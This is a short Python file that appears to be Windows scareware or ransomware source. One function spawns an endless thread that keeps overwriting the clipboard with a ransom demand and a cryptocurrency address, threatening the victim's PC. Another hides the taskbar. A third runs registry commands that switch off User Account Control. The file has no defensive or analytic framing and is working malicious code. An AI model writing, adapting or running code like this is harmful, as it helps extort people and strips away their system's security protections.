import pyperclip, threading, time,ctypes,subprocess
def remindme():
    threading.Thread(target=lambda: [time.sleep(3) or pyperclip.copy("PAY 100 USD AT LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB OR YOUR PC WILL BE FUCKED") or time.sleep(0.001) for _ in iter(int, 1)]).start()
def hidetaskbar():
    try:
        hwnd_taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd_taskbar, 0)
    except Exception as e:
        print(f"Error: {e}")
def no_uac():
    try:
        subprocess.run(['reg', 'add', r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', '/v', 'EnableLUA', '/t', 'REG_DWORD', '/d', '0', '/f'])
        subprocess.run(['reg', 'add', r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', '/v', 'ConsentPromptBehaviorAdmin', '/t', 'REG_DWORD', '/d', '0', '/f'])
    except Exception as e:
        print(f"Error: {e}")        